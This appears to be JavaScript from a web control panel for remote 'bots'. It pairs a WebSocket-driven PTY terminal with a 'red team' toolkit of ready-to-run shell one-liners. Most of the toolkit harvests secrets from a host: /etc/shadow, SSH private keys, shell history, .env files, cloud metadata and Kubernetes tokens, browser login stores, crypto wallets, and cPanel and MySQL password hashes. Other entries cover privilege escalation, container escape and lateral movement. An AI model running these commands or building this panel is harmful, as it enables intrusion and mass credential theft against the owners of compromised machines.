  var btn = document.getElementById('pty-default-btn');
  if (btn && ptyDefaultMode) { btn.classList.add('active'); btn.style.color = 'var(--green)'; }
})();

function togglePtyMode() {
  if (ptyMode) {
    exitPtyMode();
  } else {
    enterPtyMode();
  }
}

function togglePtyDefault() {
  ptyDefaultMode = !ptyDefaultMode;
  lsSet('ptyDefault', ptyDefaultMode);
  var btn = document.getElementById('pty-default-btn');
  if (btn) {
    btn.classList.toggle('active', ptyDefaultMode);
    btn.style.color = ptyDefaultMode ? 'var(--green)' : '';
  }
  showToast('PTY default: ' + (ptyDefaultMode ? 'ON' : 'OFF'), true);
}

function enterPtyMode() {
  if (!shellWS || shellWS.readyState !== 1) {
    showToast('No WebSocket connection', false);
    return;
  }

  ptyMode = true;
  var btn = document.getElementById('pty-toggle-btn');
  if (btn) { btn.classList.add('active'); btn.style.color = 'var(--green)'; }

  // Hide normal shell UI, show xterm container
  document.getElementById('shell-output').style.display = 'none';
  document.getElementById('shell-input-row').style.display = 'none';
  var ptyEl = document.getElementById('pty-terminal');
  ptyEl.style.display = 'block';

  // Initialize xterm.js
  if (!ptyTerm) {
    var currentShellTheme = SHELL_THEMES[localStorage.getItem('armada_shell_theme') || 'default'] || SHELL_THEMES['default'];
    ptyTerm = new Terminal({
      cursorBlink: true,
      fontSize: 14,
      fontFamily: "'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace",
      theme: {
        background: currentShellTheme.bg,
        foreground: currentShellTheme.fg,
        cursor: currentShellTheme.cursor,
        selectionBackground: currentShellTheme.bg === '#ffffff' ? '#b4d7ff' : '#264f78',
        black: currentShellTheme.black,
        red: currentShellTheme.red,
        green: currentShellTheme.green,
        yellow: currentShellTheme.yellow,
        blue: currentShellTheme.blue,
        magenta: currentShellTheme.magenta,
        cyan: currentShellTheme.cyan,
        white: currentShellTheme.white
      },
      scrollback: 5000,
      convertEol: false
    });
    ptyFitAddon = new FitAddon.FitAddon();
    ptyTerm.loadAddon(ptyFitAddon);
    ptyTerm.open(ptyEl);
    ptyFitAddon.fit();

    // Send keyboard input to bot via WebSocket
    ptyTerm.onData(function (data) {
      if (shellWS && shellWS.readyState === 1) {
        shellWS.send(JSON.stringify({ type: 'pty_input', data: data }));
      }
    });

    // Enable browser paste (Ctrl+V / right-click) into PTY
    ptyTerm.attachCustomKeyEventHandler(function (ev) {
      // Allow Ctrl+V / Cmd+V to trigger browser paste
      if ((ev.ctrlKey || ev.metaKey) && ev.key === 'v' && ev.type === 'keydown') {
        navigator.clipboard.readText().then(function (text) {
          if (text && shellWS && shellWS.readyState === 1) {
            shellWS.send(JSON.stringify({ type: 'pty_input', data: text }));
          }
        }).catch(function () { });
        return false; // prevent xterm from handling it
      }
      // Allow Ctrl+C to send through (as interrupt)
      return true;
    });

    // Resize handler
    window.addEventListener('resize', function () {
      if (ptyMode && ptyFitAddon) ptyFitAddon.fit();
    });
  } else {
    ptyFitAddon.fit();
  }

  ptyTerm.clear();
  ptyTerm.focus();

  // Request PTY session from bot
  shellWS.send(JSON.stringify({ type: 'pty_open' }));
}

function exitPtyMode() {
  ptyMode = false;
  var btn = document.getElementById('pty-toggle-btn');
  if (btn) { btn.classList.remove('active'); btn.style.color = ''; }

  // Show normal shell UI, hide xterm container
  document.getElementById('shell-output').style.display = '';
  document.getElementById('shell-input-row').style.display = '';
  document.getElementById('pty-terminal').style.display = 'none';

  // Focus normal input
  var inp = document.getElementById('shell-input');
  if (inp) inp.focus();
}

// Handle PTY messages from WebSocket
function handlePtyMessage(msg) {
  if (!ptyTerm) return;
  switch (msg.type) {
    case 'pty_output':
      // msg.data is base64-encoded PTY output
      try {
        var raw = atob(msg.data);
        ptyTerm.write(raw);
      } catch (e) {
        // If not valid base64, write as-is
        ptyTerm.write(msg.data);
      }
      break;
    case 'pty_opened':
      ptyTerm.write('\r\n\x1b[32m[PTY session opened]\x1b[0m\r\n');
      break;
    case 'pty_closed':
      ptyTerm.write('\r\n\x1b[31m[PTY session closed]\x1b[0m\r\n');
      break;
    case 'pty_error':
      ptyTerm.write('\r\n\x1b[31m[PTY error: ' + (msg.error || 'unknown') + ']\x1b[0m\r\n');
      break;
  }
}

// Paste clipboard contents into PTY
function shellPtyPaste() {
  if (!ptyMode || !shellWS || shellWS.readyState !== 1) {
    // Fallback: paste into normal shell input
    navigator.clipboard.readText().then(function (text) {
      var inp = document.getElementById('shell-input');
      if (inp && text) { inp.value += text; inp.focus(); }
    }).catch(function () { showToast('Clipboard access denied', false); });
    return;
  }
  navigator.clipboard.readText().then(function (text) {
    if (text) {
      shellWS.send(JSON.stringify({ type: 'pty_input', data: text }));
      if (ptyTerm) ptyTerm.focus();
    }
  }).catch(function () { showToast('Clipboard access denied — use Ctrl+Shift+V', false); });
}

// ---------------------------------------------------------------------------
// Toolkit — red team helpers dropdown with command preview
// ---------------------------------------------------------------------------

var toolkitItems = [
  { cat: 'Recon' },
  { name: 'Net Scan', cmd: 'echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null && echo "=== ROUTES ===" && ip route 2>/dev/null || route -n 2>/dev/null && echo "=== ARP ===" && ip neigh 2>/dev/null || arp -a 2>/dev/null && echo "=== LISTENERS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
  { name: 'System Info', cmd: 'echo "=== HOSTNAME ===" && hostname && echo "=== KERNEL ===" && uname -a && echo "=== DISTRO ===" && cat /etc/*release 2>/dev/null | head -5 && echo "=== UPTIME ===" && uptime && echo "=== CPU ===" && nproc && echo "=== RAM ===" && free -h' },
  { name: 'Who / Users', cmd: 'echo "=== LOGGED IN ===" && w 2>/dev/null || who && echo "=== /etc/passwd (shells) ===" && grep -v nologin /etc/passwd | grep -v /false' },
  { name: 'Disk Usage', cmd: 'df -h 2>/dev/null && echo "=== MOUNTS ===" && mount | grep -v cgroup | grep -v proc' },
  { name: 'Running Procs', cmd: 'ps aux --sort=-%mem 2>/dev/null | head -25 || ps aux | head -25' },
  { name: 'Open Ports', cmd: 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
  { name: 'DNS Config', cmd: 'cat /etc/resolv.conf 2>/dev/null && echo "=== HOSTS ===" && cat /etc/hosts' },
  { cat: 'Credentials' },
  { name: 'SSH Keys', cmd: 'echo "=== AUTHORIZED ===" && cat ~/.ssh/authorized_keys 2>/dev/null; for u in $(ls /home/); do echo "=== /home/$u ===" && cat /home/$u/.ssh/authorized_keys 2>/dev/null; done; echo "=== HOST KEYS ===" && ls -la /etc/ssh/ssh_host_* 2>/dev/null' },
  { name: 'Bash History', cmd: 'cat ~/.bash_history 2>/dev/null | tail -50; for u in $(ls /home/); do echo "=== $u ===" && cat /home/$u/.bash_history 2>/dev/null | tail -20; done' },
  { name: 'Passwd / Shadow', cmd: 'cat /etc/passwd && echo "=== SHADOW ===" && cat /etc/shadow 2>/dev/null || echo "(no read access to shadow)"' },
  { name: 'Env / Secrets', cmd: 'env | grep -iE "pass|key|token|secret|api|auth|cred" 2>/dev/null; echo "=== .env files ===" && find / -name ".env" -readable 2>/dev/null | head -10' },
  { name: 'SSH Config', cmd: 'cat ~/.ssh/config 2>/dev/null; echo "=== Known Hosts ===" && cat ~/.ssh/known_hosts 2>/dev/null | head -20' },
  { name: 'WiFi Passwords', cmd: 'find /etc/NetworkManager/system-connections/ -name "*.nmconnection" 2>/dev/null | xargs grep -H psk= 2>/dev/null; cat /etc/wpa_supplicant/*.conf 2>/dev/null | grep -A3 "network=" | grep -E "ssid|psk"' },
  { name: 'History (all shells)', cmd: 'cat ~/.bash_history ~/.zsh_history ~/.ash_history ~/.history 2>/dev/null | grep -iE "pass|token|key|secret|curl.*-u|wget.*--password|mysql.*-p|sshpass" | sort -u | tail -30' },
  { name: 'Database Configs', cmd: 'cat /etc/mysql/debian.cnf 2>/dev/null; cat /etc/my.cnf 2>/dev/null | grep -i pass; cat /var/www/*/wp-config.php 2>/dev/null | grep -i "DB_"; find / -name "config.php" -path "*/phpmyadmin/*" 2>/dev/null | xargs grep -i "pass" 2>/dev/null | head -10' },
  { name: 'SNMP Communities', cmd: 'cat /etc/snmp/snmpd.conf 2>/dev/null | grep -v "^#" | grep -i community; cat /etc/snmp/snmp.conf 2>/dev/null' },
  { cat: 'Persistence' },
  { name: 'Crontabs', cmd: 'echo "=== ROOT CRONTAB ===" && crontab -l 2>/dev/null; echo "=== SYSTEM CRON ===" && ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/crontabs/ 2>/dev/null' },
  { name: 'Systemd Services', cmd: 'systemctl list-units --type=service --state=running 2>/dev/null | head -30 || ls /etc/init.d/ 2>/dev/null' },
  { name: 'Startup Files', cmd: 'cat /etc/rc.local 2>/dev/null; echo "=== PROFILE ===" && cat /etc/profile.d/*.sh 2>/dev/null | head -20; echo "=== BASHRC ===" && cat ~/.bashrc 2>/dev/null | tail -10' },
  { cat: 'Lateral Movement' },
  { name: 'ARP Neighbors', cmd: 'ip neigh 2>/dev/null || arp -a 2>/dev/null' },
  { name: 'Internal Hosts', cmd: 'cat /etc/hosts && echo "=== KNOWN SSH ===" && cat ~/.ssh/known_hosts 2>/dev/null | awk "{print \\$1}" | sort -u | head -20' },
  { name: 'Docker / LXC', cmd: 'echo "=== DOCKER ===" && docker ps -a 2>/dev/null || echo "(no docker)"; echo "=== LXC ===" && lxc list 2>/dev/null || echo "(no lxc)"; echo "=== CONTAINERS ===" && cat /proc/1/cgroup 2>/dev/null | head -5' },
  { name: 'Network Shares', cmd: 'echo "=== NFS ===" && showmount -e 127.0.0.1 2>/dev/null || echo "(no nfs)"; echo "=== SMB ===" && smbclient -L 127.0.0.1 -N 2>/dev/null || echo "(no smb)"; echo "=== FSTAB ===" && grep -v "^#" /etc/fstab 2>/dev/null' },
  { name: 'SSH Keys (all users)', cmd: 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "authorized_keys" 2>/dev/null | while read f; do echo "=== $f ==="; head -2 "$f" 2>/dev/null; echo ""; done | head -50' },
  { name: 'SSH Agent Sockets', cmd: 'find /tmp -name "agent.*" -type s 2>/dev/null; ls -la /tmp/ssh-* 2>/dev/null; echo "=== ENV ===" && env | grep SSH_AUTH_SOCK' },
  { name: 'Internal Subnets', cmd: 'ip route 2>/dev/null || route -n 2>/dev/null; echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null | grep inet | awk "{print \\$2}"' },
  { name: 'Active Listeners', cmd: 'ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null' },
  { name: 'SSH Config Files', cmd: 'cat /etc/ssh/ssh_config 2>/dev/null | grep -v "^#" | grep -v "^$"; echo "=== USER ===" && cat ~/.ssh/config 2>/dev/null; find /home -name "config" -path "*/.ssh/*" 2>/dev/null | xargs cat 2>/dev/null' },
  { cat: 'Cloud' },
  { name: 'AWS IMDSv1', cmd: 'curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/ && echo "" && echo "=== IDENTITY ===" && curl -sf --connect-timeout 2 http://169.254.169.254/latest/dynamic/instance-identity/document && echo "" && echo "=== CREDS ===" && curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | xargs -I{} curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/{}' },
  { name: 'AWS IMDSv2', cmd: 'TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null) && echo "Token: $TOKEN" && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document && echo "" && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
  { name: 'GCP Metadata', cmd: 'curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json" 2>/dev/null | python3 -m json.tool 2>/dev/null || curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null' },
  { name: 'GCP Service Acct Token', cmd: 'curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null && echo "" && curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null' },
  { name: 'Azure IMDS', cmd: 'curl -sf -H "Metadata: true" --connect-timeout 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | python3 -m json.tool 2>/dev/null; echo "=== MSI TOKEN ===" && curl -sf -H "Metadata: true" --connect-timeout 2 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null' },
  { name: 'Cloud Provider Check', cmd: 'echo "=== CHECKING CLOUD PROVIDER ===" && curl -sf --connect-timeout 1 http://169.254.169.254/latest/meta-data/ami-id 2>/dev/null && echo "AWS" || true; curl -sf --connect-timeout 1 -H "Metadata-Flavor: Google" http://metadata.google.internal/ 2>/dev/null && echo "GCP" || true; curl -sf --connect-timeout 1 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-01-01" 2>/dev/null && echo "Azure" || true; [ -f /sys/hypervisor/uuid ] && echo "Xen/AWS" || true' },
  { name: 'AWS CLI Keys', cmd: 'cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; find / -name "credentials" -path "*/.aws/*" 2>/dev/null | xargs cat 2>/dev/null' },
  { name: 'K8s Service Account', cmd: 'echo "=== K8S TOKEN ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-80; echo "" && echo "=== NAMESPACE ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo "=== API SERVER ===" && env | grep -i kube' },
  { name: 'K8s API Enum', cmd: 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}" && curl -sf --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces" 2>/dev/null | python3 -m json.tool 2>/dev/null | grep name | head -20' },
  { name: 'Container Escape Check', cmd: 'echo "=== PRIVILEGED ===" && cat /proc/self/status | grep -i cap; echo "=== DOCKER SOCKET ===" && ls -la /var/run/docker.sock 2>/dev/null || echo "(no docker socket)"; echo "=== HOST MOUNTS ===" && cat /proc/mounts | grep -v tmpfs | grep -v cgroup; echo "=== CGROUP ===" && cat /proc/1/cgroup 2>/dev/null | head -5' },
  { cat: 'Docker Recon' },
  { name: 'Docker Enumerate', cmd: 'echo "=== CONTAINERS ===" && docker ps -a --format "table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}" 2>/dev/null; echo "=== IMAGES ===" && docker images --format "table {{.Repository}}\\t{{.Tag}}\\t{{.Size}}" 2>/dev/null; echo "=== NETWORKS ===" && docker network ls 2>/dev/null; echo "=== VOLUMES ===" && docker volume ls 2>/dev/null' },
  { name: 'Docker Secrets/Envs', cmd: 'for c in $(docker ps -q 2>/dev/null); do echo "=== CONTAINER: $c ==="; docker inspect $c 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -iE "Env|Secret|Password|Key|Token" | head -20; done' },
  { name: 'Docker via Socket', cmd: 'curl -sf --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E "Id|Image|Status|Names" | head -30 || echo "(no docker socket or no access)"' },
  { name: 'Docker Breakout (if priv)', cmd: 'echo "=== CHECK PRIVILEGED ===" && cat /proc/self/status | grep CapEff; echo "=== MOUNTED HOST FS ===" && ls /.dockerenv 2>/dev/null && echo "In container" && ls /proc/1/root/ 2>/dev/null | head -10' },
  { cat: 'Privesc' },
  { name: 'SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null | head -25' },
  { name: 'SGID Binaries', cmd: 'find / -perm -2000 -type f 2>/dev/null | head -25' },
  { name: 'Writable Dirs', cmd: 'find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -20' },
  { name: 'Sudo Rights', cmd: 'sudo -l 2>/dev/null || echo "(sudo not available)"' },
  { name: 'Capabilities', cmd: 'getcap -r / 2>/dev/null | head -20 || echo "(getcap not found)"' },
  { name: 'World-Writable Files', cmd: 'find /etc /opt /usr -writable -type f 2>/dev/null | head -20' },
  { name: 'Writable /etc Files', cmd: 'find /etc -writable -type f 2>/dev/null | head -20; echo "=== PASSWD WRITABLE ===" && [ -w /etc/passwd ] && echo "YES — can add user!" || echo "no"' },
  { name: 'Cron Job Hijack', cmd: 'echo "=== WRITABLE CRON SCRIPTS ===" && find /etc/cron* /var/spool/cron -writable 2>/dev/null | head -10; echo "=== CRON PATH DIRS ===" && cat /etc/crontab 2>/dev/null | grep PATH | tr ":" "\\n" | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done' },
  { name: 'Kernel Exploits', cmd: 'uname -r && echo "=== CHECK ===" && uname -a; cat /proc/version 2>/dev/null; echo "=== DMESG ERR ===" && dmesg 2>/dev/null | grep -i "segfault\\|overflow\\|error" | tail -5' },
  { name: 'PATH Injection', cmd: 'echo "=== SUID w/ relative cmds ===" && find / -perm -4000 2>/dev/null | while read b; do strings "$b" 2>/dev/null | grep -E "^[a-z]+$" | grep -vE "^(lib|GLIBC)" | head -3 | while read c; do which "$c" >/dev/null 2>&1 || echo "$b calls: $c (not absolute!)"; done; done | head -20' },
  { name: 'NFS no_root_squash', cmd: 'cat /etc/exports 2>/dev/null | grep -v "^#"; showmount -e 127.0.0.1 2>/dev/null' },
  { name: 'Doas Config', cmd: 'cat /etc/doas.conf 2>/dev/null || echo "(no doas)"; cat /usr/local/etc/doas.conf 2>/dev/null' },
  { cat: 'Exfil' },
  { name: 'Find Interesting Files', cmd: 'find / \\( -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.ini" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.bak" \\) -readable 2>/dev/null | grep -iE "pass|key|secret|token|cred|auth|db|database|config" | head -30' },
  { name: 'Dump All .env Files', cmd: 'find / -name ".env" -readable 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done | head -100' },
  { name: 'Source Code Secrets', cmd: 'find / \\( -name "*.py" -o -name "*.js" -o -name "*.php" -o -name "*.rb" -o -name "*.go" -o -name "*.java" \\) -readable 2>/dev/null | xargs grep -liE "password|api_key|secret_key|access_token|private_key|aws_secret" 2>/dev/null | head -20' },
  { name: 'Private Keys', cmd: 'find / \\( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" -o -name "id_rsa" -o -name "id_ed25519" -o -name "*.ppk" \\) -readable 2>/dev/null | head -20; find /root /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | xargs cat 2>/dev/null | head -40' },
  { name: 'DB Files (SQLite etc)', cmd: 'find / \\( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.mdb" \\) -readable 2>/dev/null | head -20' },
  { name: 'Password Managers', cmd: 'find / \\( -name "*.kdbx" -o -name "*.kdb" -o -name "pass.gpg" -o -name ".password-store" \\) 2>/dev/null | head -10; find /home /root -name "*.kdbx" 2>/dev/null' },
  { name: 'Git Config / Tokens', cmd: 'find / -name ".gitconfig" -readable 2>/dev/null | xargs cat 2>/dev/null; find / -name ".git-credentials" -readable 2>/dev/null | xargs cat 2>/dev/null; find / -path "*/.config/gh/hosts.yml" -readable 2>/dev/null | xargs cat 2>/dev/null' },
  { name: 'Docker Registry Creds', cmd: 'cat ~/.docker/config.json 2>/dev/null; find / -name "config.json" -path "*/.docker/*" 2>/dev/null | xargs cat 2>/dev/null' },
  { name: 'NPM / PyPI Tokens', cmd: 'cat ~/.npmrc 2>/dev/null; cat ~/.pypirc 2>/dev/null; cat ~/.pip/pip.conf 2>/dev/null; find /home /root -name ".npmrc" -o -name ".pypirc" 2>/dev/null | xargs cat 2>/dev/null' },
  { name: 'Slack / Discord Tokens', cmd: 'find / -name "*.json" -readable 2>/dev/null | xargs grep -liE "xoxb-|xoxp-|xapp-|discord.*token" 2>/dev/null | head -10 | xargs grep -oE "xox[bpas]-[0-9A-Za-z-]+" 2>/dev/null | head -20' },
  { name: 'Cloud Credentials (all)', cmd: 'echo "=== AWS ===" && cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; echo "=== GCP ===" && cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null | head -20; echo "=== Azure ===" && cat ~/.azure/accessTokens.json 2>/dev/null | head -20; cat ~/.azure/azureProfile.json 2>/dev/null | head -20; echo "=== DO ===" && cat ~/.config/doctl/config.yaml 2>/dev/null | grep token; echo "=== Terraform ===" && find / -name "*.tfstate" -readable 2>/dev/null | head -5 | xargs grep -l "password\\|secret\\|token" 2>/dev/null' },
  { name: 'Browser Sessions (all)', cmd: 'find /home /root \\( -name "cookies.sqlite" -o -name "Cookies" -o -name "Login Data" -o -name "logins.json" -o -name "key4.db" -o -name "signons.sqlite" \\) 2>/dev/null; find /home /root -path "*Local Storage*" -name "*.ldb" 2>/dev/null | head -10' },
  { name: 'Clipboard', cmd: 'xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || wl-paste 2>/dev/null || echo "(no clipboard tool)"' },
  { name: 'Mail Spools', cmd: 'ls /var/mail/ 2>/dev/null && cat /var/mail/$USER 2>/dev/null | head -40' },
  { name: 'Wallet / Crypto', cmd: 'find / -name "*.wallet" -o -name "wallet.dat" -o -name "*.keystore" 2>/dev/null | head -10; find / -path "*/.bitcoin/wallet.dat" -o -path "*/.ethereum/keystore" 2>/dev/null | head -10' },
  { name: 'DB Credentials', cmd: 'find / \\( -name "wp-config.php" -o -name "settings.py" -o -name "database.yml" -o -name ".env" \\) -readable 2>/dev/null | xargs grep -liE "password|passwd|db_pass" 2>/dev/null | head -10' },
  { cat: 'Mining Recon' },
  { name: 'Active Miners', cmd: 'ps aux 2>/dev/null | grep -iE "xmrig|minerd|cgminer|bfgminer|ethminer|nbminer|lolminer|t-rex|gminer|phoenix|teamred|nicehash|cpuminer|cryptonight|monero" | grep -v grep; ls /tmp/.* /var/tmp/.* 2>/dev/null | grep -iE "xmr|mine|crypt" | head -10' },
  { name: 'Cron Miners', cmd: 'crontab -l 2>/dev/null | grep -iE "wget|curl|bash|sh -c|xmr|mine"; for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | grep -iE "wget|curl|base64|xmr|mine" && echo "(user: $u)"; done; grep -r "wget\\|curl" /etc/cron* /var/spool/cron 2>/dev/null | grep -iE "base64|xmr|mine|\.sh" | head -10' },
  { name: 'Miner Processes (deep)', cmd: 'ps auxww 2>/dev/null | grep -E "stratum|pool\\." | grep -v grep | head -20; ss -tp 2>/dev/null | grep -E "330[0-9]|444[0-9]|14444|45560|3333|5555|7777" | head -15; netstat -tnp 2>/dev/null | grep -E "330[0-9]|444[0-9]|14444" | head -10' },
  { name: 'Pool Connections', cmd: 'ss -tn state established 2>/dev/null | awk \'{print $5}\' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20; cat /proc/net/tcp 2>/dev/null | awk \'NR>1{printf "%d.%d.%d.%d:%d\\n", strtonum("0x"substr($3,7,2)),strtonum("0x"substr($3,5,2)),strtonum("0x"substr($3,3,2)),strtonum("0x"substr($3,1,2)),strtonum("0x"substr($3,10))}\' | head -20' },
  { name: 'GPU / CPU Info', cmd: 'echo "=== CPU ===" && cat /proc/cpuinfo | grep -E "model name|cpu MHz|cores" | sort -u; echo "=== GPU ===" && nvidia-smi 2>/dev/null || lspci 2>/dev/null | grep -iE "vga|3d|nvidia|amd|radeon|intel" | head -10; echo "=== OpenCL ===" && ls /dev/nvidia* /dev/dri/* 2>/dev/null' },
  { name: 'Installed Mining Tools', cmd: 'which xmrig xmr-stak cpuminer bfgminer cgminer ethminer nbminer lolminer t-rex gminer 2>/dev/null; find / -name "xmrig" -o -name "xmr-stak" -o -name "cpuminer" 2>/dev/null | head -10; find /tmp /var/tmp /dev/shm -executable -type f 2>/dev/null | head -10' },
  { name: 'Mining Config Files', cmd: 'find / -name "config.json" -readable 2>/dev/null | xargs grep -l "pool\\|stratum\\|wallet\\|xmr" 2>/dev/null | head -10 | xargs cat 2>/dev/null | grep -iE "pool|url|user|wallet|algo" | head -30' },
  { name: 'Systemd Miners', cmd: 'systemctl list-units --type=service 2>/dev/null | grep -iE "xmr|mine|crypt|monero"; find /etc/systemd /lib/systemd /usr/lib/systemd -name "*.service" 2>/dev/null | xargs grep -liE "xmrig|xmr|miner|cryptonight" 2>/dev/null | head -5 | xargs cat 2>/dev/null' },
  { name: 'Resource Usage Spike', cmd: 'echo "=== Top CPU ===" && ps aux --sort=-%cpu 2>/dev/null | head -10 || ps aux | head -10; echo "=== Load Average ===" && uptime; echo "=== Memory ===" && free -h; echo "=== High CPU Procs ===" && ps aux 2>/dev/null | awk \'$3>20{print}\'' },
  { name: 'Ld.so / Library Hijack', cmd: 'cat /etc/ld.so.preload 2>/dev/null && echo "PRELOAD SET" || echo "(no preload)"; echo "=== LD_PRELOAD ENV ===" && env | grep LD_; cat /etc/ld.so.conf 2>/dev/null; ls -la /etc/ld.so.conf.d/ 2>/dev/null' },
  { cat: 'CMS / Web Panels' },
  { name: 'WordPress Config', cmd: 'find / -name "wp-config.php" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "DB_|table_prefix|secret_key|AUTH_KEY" "$f" 2>/dev/null; done | head -60' },
  { name: 'WordPress Users', cmd: 'find / -name "wp-config.php" -readable 2>/dev/null | head -3 | while read f; do dir=$(dirname "$f"); php -r "define(\'ABSPATH\',\'$dir/\'); require(\'$dir/wp-load.php\'); global \$wpdb; print_r(\$wpdb->get_results(\'SELECT user_login,user_pass,user_email FROM wp_users LIMIT 20\'));" 2>/dev/null || grep -r "user_login\\|user_pass" "$dir/wp-content" 2>/dev/null | head -5; done' },
  { name: 'WordPress Plugins', cmd: 'find / -name "wp-config.php" 2>/dev/null | head -3 | while read f; do dir=$(dirname "$f"); echo "=== $dir/wp-content/plugins ==="; ls "$dir/wp-content/plugins/" 2>/dev/null; done' },
  { name: 'Joomla Config', cmd: 'find / -name "configuration.php" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "\\$db|\\$password|\\$user|\\$secret|\\$host" "$f" 2>/dev/null; done | head -60' },
  { name: 'Drupal Config', cmd: 'find / \\( -name "settings.php" -o -name "settings.local.php" \\) -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "database|username|password|host|driver" "$f" 2>/dev/null; done | head -60' },
  { name: 'Laravel/Symfony .env', cmd: 'find / -name ".env" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -iE "DB_|MAIL_|AWS_|APP_KEY|SECRET|TOKEN|PASSWORD" "$f" 2>/dev/null; done | head -80' },
  { name: 'cPanel Users', cmd: 'ls /var/cpanel/users/ 2>/dev/null | head -30; cat /etc/trueuserdomains 2>/dev/null | head -20; ls /home/ 2>/dev/null' },
  { name: 'cPanel Passwords', cmd: 'cat /var/cpanel/users/*/shadow 2>/dev/null | head -30; find /var/cpanel -name "*.pass" -o -name "*.shadow" 2>/dev/null | xargs cat 2>/dev/null | head -30' },
  { name: 'cPanel MySQL DBs', cmd: 'mysql -u root -e "SHOW DATABASES; SELECT user,password,host FROM mysql.user;" 2>/dev/null; cat /root/.my.cnf 2>/dev/null; find /etc -name "*.cnf" -readable 2>/dev/null | xargs grep -iE "pass|user" 2>/dev/null | head -20' },
  { name: 'cPanel Mail / Email', cmd: 'ls /home/*/mail/ 2>/dev/null | head -20; find /var/cpanel -name "*.shadow" 2>/dev/null | head -5 | xargs cat 2>/dev/null; cat /etc/valiases/* 2>/dev/null | head -20' },
  { name: 'WHM/cPanel Config', cmd: 'cat /usr/local/cpanel/cpanel.config 2>/dev/null | grep -iE "pass|key|token|mysql" | head -20; cat /var/cpanel/cpanel.config 2>/dev/null | head -30' },
  { name: 'Web Server Configs', cmd: 'find /etc/nginx /etc/apache2 /etc/httpd /usr/local/apache /usr/local/nginx -name "*.conf" -readable 2>/dev/null | xargs grep -liE "password|secret|auth_basic|ssl_certificate_key" 2>/dev/null | head -10 | xargs cat 2>/dev/null | grep -iE "pass|secret|key" | head -30' },
  { name: 'PHP Session Files', cmd: 'ls -lt /tmp/sess_* /var/lib/php/sessions/sess_* 2>/dev/null | head -10; cat /tmp/sess_* 2>/dev/null | head -20 | strings | grep -iE "user|pass|email|token" | head -20' },
  { name: 'Database Dumps', cmd: 'find / -name "*.sql" -o -name "*.sql.gz" -o -name "*.dump" 2>/dev/null | head -20; find /var/www /home /srv -name "backup*" -type f 2>/dev/null | head -10' },
  { name: 'FTP Credentials', cmd: 'cat /etc/proftpd.conf /etc/proftpd/proftpd.conf 2>/dev/null | grep -iE "pass|user|auth" | head -10; cat /etc/vsftpd.conf 2>/dev/null | grep -v "^#" | head -20; find /home -name ".ftppass" -o -name "*.netrc" 2>/dev/null | xargs cat 2>/dev/null' },
  { cat: 'IoT / Embedded' },
  { name: 'Firmware Info', cmd: 'cat /etc/openwrt_release 2>/dev/null || cat /etc/firmware_version 2>/dev/null; strings /dev/mtdblock0 2>/dev/null | head -20' },
  { name: 'BusyBox Check', cmd: 'busybox 2>&1 | head -3; ls /bin/busybox /usr/bin/busybox 2>/dev/null' },
